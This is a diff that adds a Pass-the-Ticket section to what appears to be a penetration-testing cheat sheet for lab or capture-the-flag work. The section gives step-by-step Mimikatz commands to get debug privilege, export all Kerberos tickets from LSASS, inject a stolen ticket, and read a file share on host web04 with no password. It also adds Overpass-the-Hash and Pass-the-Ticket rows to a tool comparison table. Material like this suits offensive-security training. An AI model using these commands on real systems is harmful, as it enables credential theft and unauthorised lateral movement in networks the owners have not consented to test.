@@ -180,6 +180,48 @@ type C:\Users\Administrator\Desktop\flag.txt
 
 
 ===========================================================================
+  [7] PASS-THE-TICKET (PtT) — Mimikatz (Windows)
+      Steal and inject Kerberos tickets to access resources as another user
+===========================================================================
+
+# Step 1 — Run Mimikatz and get privileges
+mimikatz # privilege::debug
+
+# Step 2 — Export ALL Kerberos tickets from LSASS to .kirbi files
+mimikatz # sekurlsa::tickets /export
+
+# This creates .kirbi files in current directory — check with:
+dir *.kirbi
+
+# Ticket naming convention:
+# [session]-[type]-[user@service-target].kirbi
+# cifs    = SMB/file share access
+# krbtgt  = TGT (most powerful — can request new service tickets)
+# ldap    = LDAP access to DC
+# http    = HTTP service access
+
+# Step 3 — Pick the right ticket and inject it
+# For file share access to a target:
+mimikatz # kerberos::ptt [0;11a423]-0-0-40810000-dave@cifs-web04.kirbi
+
+# Step 4 — Verify ticket was loaded
+mimikatz # exit
+klist
+
+# Step 5 — Access the resource using the injected ticket (no password needed!)
+ls \\web04\backup
+type \\web04\backup\flag.txt
+
+# NOTES:
+# - No password or hash needed — just the .kirbi file
+# - Pick cifs tickets for file share access
+# - Pick krbtgt tickets for TGTs (most powerful)
+# - klist confirms ticket is loaded before accessing resources
+# - Ticket is injected into current logon session only
+# - sekurlsa::tickets /export requires admin/SeDebugPrivilege
+
+
+===========================================================================
   TOOL COMPARISON
 ===========================================================================
 
@@ -192,6 +234,8 @@ type C:\Users\Administrator\Desktop\flag.txt
   impacket-psexec     | Kali          | SMB/445     | Yes         | Low
   impacket-wmiexec    | Kali          | WMI         | Yes         | High
   impacket-smbexec    | Kali          | SMB/445     | Yes         | Medium
+  Overpass-the-Hash   | Mimikatz      | Kerberos    | Yes         | High
+  Pass-the-Ticket     | Mimikatz      | Kerberos    | No          | High
 
 
 ===========================================================================
